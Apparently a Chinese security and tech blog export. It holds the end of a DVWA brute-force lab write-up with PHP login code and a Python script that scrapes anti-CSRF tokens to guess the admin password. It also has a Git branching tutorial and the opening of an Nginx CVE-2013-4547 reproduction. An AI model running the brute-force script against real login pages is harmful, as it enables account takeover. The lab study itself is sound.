? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res &#x3D; mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;&#x2F;pre&gt;&#39; );</span><br><span class="line"></span><br><span class="line">    if( $result &amp;&amp; mysqli_num_rows( $result ) &#x3D;&#x3D; 1 ) &#123;</span><br><span class="line">        &#x2F;&#x2F; Get users details</span><br><span class="line">        $row    &#x3D; mysqli_fetch_assoc( $result );</span><br><span class="line">        $avatar &#x3D; $row[&quot;avatar&quot;];</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Login successful</span><br><span class="line">        echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;img src&#x3D;\&quot;&#123;$avatar&#125;\&quot; &#x2F;&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        &#x2F;&#x2F; Login failed</span><br><span class="line">        sleep( rand( 0, 3 ) );</span><br><span class="line">        echo &quot;&lt;pre&gt;&lt;br &#x2F;&gt;Username and&#x2F;or password incorrect.&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res &#x3D; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>High级别的代码加入了Token，可以抵御CSRF攻击，同时也增加了爆破的难度，通过抓包，可以看到，登录验证时提交了四个参数：<code>username</code>、<code>password</code>、<code>Login</code>以及<code>user_token</code>。<br>![](DWVA之Brute Force/Force7.jpg)</p>
<p>每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。<br>![](DWVA之Brute Force/Force8.jpg)<br>同时，High级别的代码中，使用了stripslashes（去除字符串中的反斜线字符,如果有两个连续的反斜线,则只去掉一个）、 mysql_real_escape_string对参数username、password进行过滤、转义，进一步抵御sql注入。</p>
<h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>由于加入了<code>Anti-CSRFtoken</code>预防无脑爆破，这里就不推荐用Burpsuite了，还是简单用python写个脚本吧。<br>下面是我找的的一个脚本（python 2.7），用户名为<code>admin</code>，对<code>password</code>参数进行爆破并打印结果，仅供各位参考。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import urllib2</span><br><span class="line">header&#x3D;&#123;        &#39;Host&#39;: &#39;192.168.153.130&#39;,</span><br><span class="line">		&#39;Cache-Control&#39;: &#39;max-age&#x3D;0&#39;,</span><br><span class="line">		&#39;If-None-Match&#39;: &quot;307-52156c6a290c0&quot;,</span><br><span class="line">		&#39;If-Modified-Since&#39;: &#39;Mon, 05 Oct 2015 07:51:07 GMT&#39;,</span><br><span class="line">		&#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (Windows NT 6.1; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;53.0.2785.116 Safari&#x2F;537.36&#39;,</span><br><span class="line">		&#39;Accept&#39;: &#39;*&#x2F;*&#39;,</span><br><span class="line">		&#39;Referer&#39;: &#39;http:&#x2F;&#x2F;192.168.153.130&#x2F;dvwa&#x2F;vulnerabilities&#x2F;brute&#x2F;index.php&#39;,</span><br><span class="line">		&#39;Accept-Encoding&#39;: &#39;gzip, deflate, sdch&#39;,</span><br><span class="line">		&#39;Accept-Language&#39;: &#39;zh-CN,zh;q&#x3D;0.8&#39;,</span><br><span class="line">		&#39;Cookie&#39;: &#39;security&#x3D;high; PHPSESSID&#x3D;5re92j36t4f2k1gvnqdf958bi2&#39;&#125;</span><br><span class="line">requrl &#x3D; &quot;http:&#x2F;&#x2F;192.168.153.130&#x2F;dvwa&#x2F;vulnerabilities&#x2F;brute&#x2F;&quot;</span><br><span class="line"></span><br><span class="line">def get_token(requrl,header):</span><br><span class="line">	req &#x3D; urllib2.Request(url&#x3D;requrl,headers&#x3D;header)</span><br><span class="line">	response &#x3D; urllib2.urlopen(req)</span><br><span class="line">	print response.getcode(),</span><br><span class="line">	the_page &#x3D; response.read()</span><br><span class="line">	print len(the_page)</span><br><span class="line">	soup &#x3D; BeautifulSoup(the_page,&quot;html.parser&quot;)</span><br><span class="line">	user_token &#x3D; soup.form.input.input.input.input[&quot;value&quot;] #get the user_token</span><br><span class="line">	return user_token</span><br><span class="line"></span><br><span class="line">user_token &#x3D; get_token(requrl,header)</span><br><span class="line">i&#x3D;0</span><br><span class="line">for line in open(&quot;rkolin.txt&quot;):</span><br><span class="line">	requrl &#x3D; &quot;http:&#x2F;&#x2F;192.168.153.130&#x2F;dvwa&#x2F;vulnerabilities&#x2F;brute&#x2F;&quot;+&quot;?username&#x3D;admin&amp;password&#x3D;&quot;+line.strip()+&quot;&amp;Login&#x3D;Login&amp;user_token&#x3D;&quot;+user_token</span><br><span class="line">	i &#x3D; i+1</span><br><span class="line">	print i,&#39;admin&#39;,line.strip(),</span><br><span class="line">	user_token &#x3D; get_token(requrl,header)</span><br><span class="line">	if (i &#x3D;&#x3D; 10):</span><br><span class="line">		break</span><br></pre></td></tr></table></figure>

<p>get_token的功能是通过python的BeautifulSoup库从html页面中抓取user_token的值，为了方便展示，这里设置只尝试10次。</p>
<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><h3 id="核心代码-3"><a href="#核心代码-3" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#39;Login&#39; ] ) &amp;&amp; isset ($_POST[&#39;username&#39;]) &amp;&amp; isset ($_POST[&#39;password&#39;]) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Sanitise username input</span><br><span class="line">    $user &#x3D; $_POST[ &#39;username&#39; ];</span><br><span class="line">    $user &#x3D; stripslashes( $user );</span><br><span class="line">    $user &#x3D; ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Sanitise password input</span><br><span class="line">    $pass &#x3D; $_POST[ &#39;password&#39; ];</span><br><span class="line">    $pass &#x3D; stripslashes( $pass );</span><br><span class="line">    $pass &#x3D; ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">    $pass &#x3D; md5( $pass );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Default values</span><br><span class="line">    $total_failed_login &#x3D; 3;</span><br><span class="line">    $lockout_time       &#x3D; 15;</span><br><span class="line">    $account_locked     &#x3D; false;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check the database (Check user information)</span><br><span class="line">    $data &#x3D; $db-&gt;prepare( &#39;SELECT failed_login, last_login FROM users WHERE user &#x3D; (:user) LIMIT 1;&#39; );</span><br><span class="line">    $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">    $row &#x3D; $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check to see if the user has been locked out.</span><br><span class="line">    if( ( $data-&gt;rowCount() &#x3D;&#x3D; 1 ) &amp;&amp; ( $row[ &#39;failed_login&#39; ] &gt;&#x3D; $total_failed_login ) )  &#123;</span><br><span class="line">        &#x2F;&#x2F; User locked out.  Note, using this method would allow for user enumeration!</span><br><span class="line">        &#x2F;&#x2F;echo &quot;&lt;pre&gt;&lt;br &#x2F;&gt;This account has been locked due to too many incorrect logins.&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Calculate when the user would be allowed to login again</span><br><span class="line">        $last_login &#x3D; strtotime( $row[ &#39;last_login&#39; ] );</span><br><span class="line">        $timeout    &#x3D; $last_login + ($lockout_time * 60);</span><br><span class="line">        $timenow    &#x3D; time();</span><br><span class="line"></span><br><span class="line">        &#x2F;*</span><br><span class="line">        print &quot;The last login was: &quot; . date (&quot;h:i:s&quot;, $last_login) . &quot;&lt;br &#x2F;&gt;&quot;;</span><br><span class="line">        print &quot;The timenow is: &quot; . date (&quot;h:i:s&quot;, $timenow) . &quot;&lt;br &#x2F;&gt;&quot;;</span><br><span class="line">        print &quot;The timeout is: &quot; . date (&quot;h:i:s&quot;, $timeout) . &quot;&lt;br &#x2F;&gt;&quot;;</span><br><span class="line">        *&#x2F;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Check to see if enough time has passed, if it hasn&#39;t locked the account</span><br><span class="line">        if( $timenow &lt; $timeout ) &#123;</span><br><span class="line">            $account_locked &#x3D; true;</span><br><span class="line">            &#x2F;&#x2F; print &quot;The account is locked&lt;br &#x2F;&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check the database (if username matches the password)</span><br><span class="line">    $data &#x3D; $db-&gt;prepare( &#39;SELECT * FROM users WHERE user &#x3D; (:user) AND password &#x3D; (:password) LIMIT 1;&#39; );</span><br><span class="line">    $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR);</span><br><span class="line">    $data-&gt;bindParam( &#39;:password&#39;, $pass, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">    $row &#x3D; $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; If its a valid login...</span><br><span class="line">    if( ( $data-&gt;rowCount() &#x3D;&#x3D; 1 ) &amp;&amp; ( $account_locked &#x3D;&#x3D; false ) ) &#123;</span><br><span class="line">        &#x2F;&#x2F; Get users details</span><br><span class="line">        $avatar       &#x3D; $row[ &#39;avatar&#39; ];</span><br><span class="line">        $failed_login &#x3D; $row[ &#39;failed_login&#39; ];</span><br><span class="line">        $last_login   &#x3D; $row[ &#39;last_login&#39; ];</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Login successful</span><br><span class="line">        echo &quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;&#123;$user&#125;&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;img src&#x3D;\&quot;&#123;$avatar&#125;\&quot; &#x2F;&gt;&quot;;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Had the account been locked out since last login?</span><br><span class="line">        if( $failed_login &gt;&#x3D; $total_failed_login ) &#123;</span><br><span class="line">            echo &quot;&lt;p&gt;&lt;em&gt;Warning&lt;&#x2F;em&gt;: Someone might of been brute forcing your account.&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;p&gt;Number of login attempts: &lt;em&gt;&#123;$failed_login&#125;&lt;&#x2F;em&gt;.&lt;br &#x2F;&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;&#x2F;em&gt;.&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Reset bad login count</span><br><span class="line">        $data &#x3D; $db-&gt;prepare( &#39;UPDATE users SET failed_login &#x3D; &quot;0&quot; WHERE user &#x3D; (:user) LIMIT 1;&#39; );</span><br><span class="line">        $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        &#x2F;&#x2F; Login failed</span><br><span class="line">        sleep( rand( 2, 4 ) );</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Give the user some feedback</span><br><span class="line">        echo &quot;&lt;pre&gt;&lt;br &#x2F;&gt;Username and&#x2F;or password incorrect.&lt;br &#x2F;&gt;&lt;br&#x2F;&gt;Alternative, the account has been locked because of too many failed logins.&lt;br &#x2F;&gt;If this is the case, &lt;em&gt;please try again in &#123;$lockout_time&#125; minutes&lt;&#x2F;em&gt;.&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Update bad login count</span><br><span class="line">        $data &#x3D; $db-&gt;prepare( &#39;UPDATE users SET failed_login &#x3D; (failed_login + 1) WHERE user &#x3D; (:user) LIMIT 1;&#39; );</span><br><span class="line">        $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Set the last login time</span><br><span class="line">    $data &#x3D; $db-&gt;prepare( &#39;UPDATE users SET last_login &#x3D; now() WHERE user &#x3D; (:user) LIMIT 1;&#39; );</span><br><span class="line">    $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到Impossible级别的代码加入了可靠的防爆破机制，当检测到频繁的错误登录后，系统会将账户锁定，爆破也就无法继续。<br>![](DWVA之Brute Force/Force9.jpg)<br>同时采用了更为安全的PDO（PHP Data Object）机制防御sql注入，这是因为不能使用PDO扩展本身执行任何数据库操作，而sql注入的关键就是通过破坏sql语句结构执行恶意的sql命令。</p>
<h3 id="关于PDO："><a href="#关于PDO：" class="headerlink" title="关于PDO："></a>关于PDO：</h3><p><a href="http://www.cnblogs.com/pinocchioatbeijing/archive/2012/03/20/2407869.html" target="_blank" rel="noopener">http://www.cnblogs.com/pinocchioatbeijing/archive/2012/03/20/2407869.html</a></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
        <tag>WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>Git学习（四）</title>
    <url>/posts/9511.html</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前面已经学习了：<br><a href="https://www.sectime.top/posts/19430.html" target="_blank" rel="noopener">Git学习（三）</a><br><a href="https://www.sectime.top/posts/18335.html" target="_blank" rel="noopener">Git学习（二）</a><br><a href="https://www.sectime.top/posts/55269.html" target="_blank" rel="noopener">Git学习（一）</a></p>
<p>什么是分支呢？</p>
<p>举个例子吧，就好像你一边写着代码，同时也在带着耳机听歌，最后你的代码写完了，歌也听了。</p>
<p>分支有什么用呢？</p>
<p>比如说，你和别人在开发一个东西，但是，由于你没有写完，导致别人不能写了，这个时候，你可以创建一个分支，你在这个分支上写，不管你写的快慢，都不影响别人的开发，这样，当你们都开发完了，再把分支合并，这样就组成了完整的代码。</p>
<h2 id="0x01-创建、合并分支"><a href="#0x01-创建、合并分支" class="headerlink" title="0x01 创建、合并分支"></a>0x01 创建、合并分支</h2><p>在使用Git的时候，会自动创建一条分支，这条分支叫<code>master</code>分支。<code>HEAD</code>严格来说并不是指向提交，而是指向<code>master</code>，<code>master</code>才是指向提交的，所以，<code>HEAD</code>指向的就是当前分支。<br><img src="/posts/9511/1.png" alt><br>每次提交，master分支都会向前移动一步，这样，随着你不断提交，master分支的线也越来越长。</p>
<p>假如我们新建了一个分支 <code>test</code> ，Git新建了一个指针叫 <code>test</code> ，<code>master</code> 指向相同的提交，再把 <code>HEAD</code> 指向 <code>test</code>，就表示当前分支在 <code>test</code> 上。<br><img src="/posts/9511/2.png" alt></p>
<p>Git创建一个分支很快，因为除了增加一个 <code>test</code> 指针，改改<code>HEAD</code>的指向，工作区的文件都没有任何变化！</p>
<p>不过，从现在开始，对工作区的修改和提交就是针对test分支了，比如新提交一次后，test指针往前移动一步，而master指针不变：<br><img src="/posts/9511/3.png" alt></p>
<p>假如我们在test上的工作完成了，就可以把test并到master上。Git怎么合并呢？最简单的方法，就是直接把master指向test的当前提交，就完成了合并：<br><img src="/posts/9511/4.png" alt></p>
<p>合并完分支后，甚至可以删除dev分支。删除dev分支就是把dev指针给删掉，删掉后，我们就剩下了一条master分支：<br><img src="/posts/9511/5.png" alt></p>
<p>实战到了！！！</p>
<p>先创建一个test分支，然后切换过去</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git checkout -b test</span><br><span class="line">Switched to a new branch &#39;test&#39;</span><br></pre></td></tr></table></figure>
<p><code>git checkout</code> 命令加上 <code>-b</code> 参数表示创建并切换，相当于以下两条命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git branch test</span><br><span class="line">$ git checkout test</span><br><span class="line">Switch to branch &#39;test&#39;</span><br></pre></td></tr></table></figure>

<p><code>git branch</code>查看当前分支</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git branch</span><br><span class="line">  master</span><br><span class="line">* test</span><br></pre></td></tr></table></figure>
<p><code>git branch</code>列出所有分支，当前分支前面会标一个 <code>*</code> 号</p>
<p>然后我们正常在 test 分支上操作，比如对 <code>README.txt</code> 添加一行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Creating a new branch</span><br></pre></td></tr></table></figure>
<p>提交</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git add README.txt</span><br><span class="line"></span><br><span class="line">$ git commit -m &quot;branch test&quot;</span><br><span class="line">[test 00fecf0] branch test</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br></pre></td></tr></table></figure>
<p>切换回 master 分支</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout master</span><br><span class="line">Switch to branch &#39;master&#39;</span><br></pre></td></tr></table></figure>
<p>切换回 master 分支后，再查看一个<code>README.txt</code>文件，刚才添加的内容不见了！</p>
<p>因为那个提交是在test分支上，而master分支此刻的提交点并没有变：<br><img src="/posts/9511/6.png" alt></p>
<p>现在，我们把dev分支的工作成果合并到master分支上：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git merge test</span><br><span class="line">Updating d43cb00..00fecf0</span><br><span class="line">Fast-forward</span><br><span class="line"> README.txt | 1 +</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br></pre></td></tr></table></figure>
<p><code>git merge</code> 命令用于合并指定分支到当前分支。合并后，再查看<code>README.txt</code>的内容，就可以看到，和dev分支的最新提交是完全一样的。</p>
<p>注意到上面的<code>Fast-forward</code>信息，Git告诉我们，这次合并是“快进模式”，也就是直接把master指向test的当前提交，所以合并速度非常快。</p>
<p>合并完成后，就可以删除 test 分支了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git branch -d test</span><br><span class="line">Deleted branch test (was 00fecf0).</span><br></pre></td></tr></table></figure>
<p>删除后，查看branch，就只剩下master分支了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git branch</span><br><span class="line">* master</span><br></pre></td></tr></table></figure>
<h2 id="0x02-解决冲突"><a href="#0x02-解决冲突" class="headerlink" title="0x02 解决冲突"></a>0x02 解决冲突</h2><p>我们新建一个分支<code>feature1</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git checkout -b feature1</span><br><span class="line">Switched to a new branch &#39;feature1&#39;</span><br></pre></td></tr></table></figure>
<p>修改<code>README.txt</code>最后一行为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Creating a new branch is quick AND simple!</span><br></pre></td></tr></table></figure>
<p>在<code>feature1</code>上提交。</p>
<p>切换到 master 分支</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout master</span><br></pre></td></tr></table></figure>

<p>在 master 分支上把 <code>README.txt</code> 的最后一行改为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Creating a new branch is quick &amp; simple!</span><br></pre></td></tr></table></figure>
<p>提交</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git commit -m &quot;AND &amp;&quot;</span><br><span class="line">On branch master</span><br><span class="line">nothing to commit, working tree clean</span><br></pre></td></tr></table></figure>
<p>现在， master 分支和 feature1 分支各自都分别提交了新的内容<br><img src="/posts/9511/7.png" alt></p>
<p>但是，这样Git在合并分支的时候就会出现冲突，我们看一下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git merge feature1</span><br><span class="line">Auto-merging README.txt</span><br><span class="line">CONFLICT (content): Merge conflict in README.txt</span><br><span class="line">Automatic merge failed; fix conflicts and then commit the result.</span><br></pre></td></tr></table></figure>
<p>果然冲突了！Git告诉我们，<code>README.txt</code>文件存在冲突，必须手动解决冲突后再提交。<code>git status</code>也可以告诉我们冲突的文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">You have unmerged paths.</span><br><span class="line">  (fix conflicts and run &quot;git commit&quot;)</span><br><span class="line">  (use &quot;git merge --abort&quot; to abort the merge)</span><br><span class="line"></span><br><span class="line">Unmerged paths:</span><br><span class="line">  (use &quot;git add &lt;file&gt;...&quot; to mark resolution)</span><br><span class="line"></span><br><span class="line">        both modified:   README.txt</span><br><span class="line"></span><br><span class="line">no changes added to commit (use &quot;git add&quot; and&#x2F;or &quot;git commit -a&quot;)</span><br></pre></td></tr></table></figure>
<p>我们看一下 <code>README.txt</code> 中的内容:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat README.txt</span><br><span class="line">Git is a version control system.</span><br><span class="line">This is my first test for Git!</span><br><span class="line">Git is so good!</span><br><span class="line">Git管理的是修改</span><br><span class="line">test test test</span><br><span class="line">It is wrong!</span><br><span class="line">hahaha</span><br><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</span><br><span class="line">Creating a new branch quick &amp; simple!</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Creating a new branch is quick AND simple!</span><br><span class="line">&gt;&gt;&gt;&gt;&gt;&gt;&gt; feature1</span><br></pre></td></tr></table></figure>
<p>Git用 <code>&lt;&lt;&lt;&lt;&lt;&lt;&lt;</code>，<code>=======</code>，<code>&gt;&gt;&gt;&gt;&gt;&gt;&gt;</code> 标记出不同分支的内容，我们修改如下后保存：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Creating a new branch is quick and simple!</span><br></pre></td></tr></table></figure>
<p>再提交</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git add readme.txt </span><br><span class="line">$ git commit -m &quot;conflict fixed&quot;</span><br><span class="line">[master cf810e4] conflict fixed</span><br></pre></td></tr></table></figure>
<p>带参数的git log也可以看到分支的合并情况：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git log --graph --pretty&#x3D;oneline --abbrev-commit</span><br><span class="line">*   db2c0fe (HEAD -&gt; master) and</span><br><span class="line">|\</span><br><span class="line">| * 5134c13 (feature1) quick AND simple</span><br><span class="line">* | 0133d12 AND &amp;</span><br><span class="line">|&#x2F;</span><br><span class="line">* 00fecf0 branch test</span><br><span class="line">* d43cb00 test branch</span><br><span class="line">* b2f143d remove test.txt</span><br><span class="line">* 2a4c645 add test.txt</span><br><span class="line">* 4c574a8 add a line test</span><br><span class="line">* 9f9c092 modify README.txt</span><br><span class="line">* 081378e modify README.txt &amp; add LICENSE</span><br><span class="line">* a78dd79 change the README.txt</span><br><span class="line">* d4892a6 add a new README.txt file</span><br></pre></td></tr></table></figure>
<p>最后删除feature1分支</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git branch -d feature1</span><br><span class="line">Deleted branch feature1 (was 5134c13).</span><br></pre></td></tr></table></figure>
<h2 id="0x03-分支管理策略"><a href="#0x03-分支管理策略" class="headerlink" title="0x03 分支管理策略"></a>0x03 分支管理策略</h2><p>通常，合并分支时，如果可能，Git会用<code>Fast forward</code>模式，但这种模式下，删除分支后，会丢掉分支信息。</p>
<p>如果要强制禁用<code>Fast forward</code>模式，Git就会在merge时生成一个新的commit，这样，从分支历史上就可以看出分支信息。</p>
<p><code>--no-ff</code>表示禁用<code>Fast Forward</code>模式<br>首先，创建并切换到dev分支</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git checkout -b dev</span><br><span class="line">Switched to a new branch &#39;dev&#39;</span><br></pre></td></tr></table></figure>
<p>修改 README.txt 并提交commit<br>切换回 master 分支</p>
<p>合并分支，使用<code>--no-ff</code>参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git merge --no-ff -m &quot;merge with no-ff&quot; dev</span><br><span class="line">Merge made by the &#39;recursive&#39; strategy.</span><br><span class="line"> README.txt | 1 -</span><br><span class="line"> 1 file changed, 1 deletion(-)</span><br></pre></td></tr></table></figure>
<p>因为本次合并要创建一个新的commit，所以加上-m参数，把commit描述写进去。</p>
<p>合并后，我们用git log看看分支历史：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git log --graph --pretty&#x3D;oneline --abbrev-commit</span><br><span class="line">*   41d9b17 (HEAD -&gt; master) merge with no-ff</span><br><span class="line">|\</span><br><span class="line">| * 20a127c (dev) add branch</span><br><span class="line">|&#x2F;</span><br><span class="line">* 6a76d54 modify README.txt</span><br><span class="line">*   db2c0fe and</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>可以看到，不使用Fast forward模式，merge后就像这样：<br><img src="/posts/9511/7.png" alt></p>
<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><ol>
<li><ul>
<li>查看分支： <code>git branch</code></li>
<li>创建分支： <code>git checkout -b &lt;branch name&gt;</code></li>
<li>切换分支： <code>git checkout &lt;branch name&gt;</code></li>
<li>创建+切换分支： <code>git checkout -b &lt;branch name&gt;</code></li>
<li>合并分支到当前分支： <code>git merge &lt;branch name&gt;</code></li>
<li>删除分支： <code>git branch -d &lt;branch name&gt;</code></li>
</ul>
</li>
<li><p>当Git无法自动合并分支时，就必须首先解决冲突。解决冲突后，再提交，合并完成。</p>
<p>解决冲突就是把Git合并失败的文件手动编辑为我们希望的内容，再提交。</p>
<p>用<code>git log --graph</code>命令可以看到分支合并图。</p>
</li>
<li><p>合并分支时，加上<code>--no-ff</code>参数就可以用普通模式合并，合并后的历史有分支，能看出来曾经做过合并，而<code>fast forward</code>合并就看不出来曾经做过合并。</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx漏洞复现</title>
    <url>/posts/24706.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Nginx 是一款轻量级的 Web 服务器、反向代理服务器及电子邮件（IMAP/POP3）代理服务器，并在一个 BSD-like 协议下发行。其特点是占有内存少，并发能力强，事实上 nginx 的并发能力确实在同类型的网页服务器中表现较好。</p>
<h2 id="文件名逻辑漏洞-CVE-2013-4547"><a href="#文件名逻辑漏洞-CVE-2013-4547" class="headerlink" title="文件名逻辑漏洞(CVE-2013-4547)"></a>文件名逻辑漏洞(CVE-2013-4547)</h2><h3 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h3><p><strong>影响版本</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nginx 0.8.41 ~ 1.4.3  &#x2F;  1.5.0 ~ 1.5.7</span><br></pre></td></tr></table></figure>

<p><strong>漏洞说明</strong></p>
<p>这个漏洞其实和代码执行没有太大关系，其主要是因为错误地解析了请求的 URL ，错误地获取到用户请求的文件名，导致出现权限绕过、代码执行的连带影响。</p>
<p><strong>举个例子</strong></p>
<p>Nginx匹配到 <code>.php</code> 结尾的请求，就发送给 fastcgi 进行解析，常见的写法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location ~ \.php$ &#123;</span><br><span class="line">    include        fastcgi_params;</span><br><span class="line"></span><br><span class="line">    fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">    fastcgi_index  index.php;</span><br><span class="line">    fastcgi_param  SCRIPT_FILENAME  &#x2F;var&#x2F;www&#x2F;html$fastcgi_script_name;</span><br><span class="line">    fastcgi_param  DOCUMENT_ROOT &#x2F;var&#x2F;www&#x2F;html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>正常情况下(关闭pathinfo的情况下)，只有.php后缀的文件才会被发送给fastcgi解析</p>
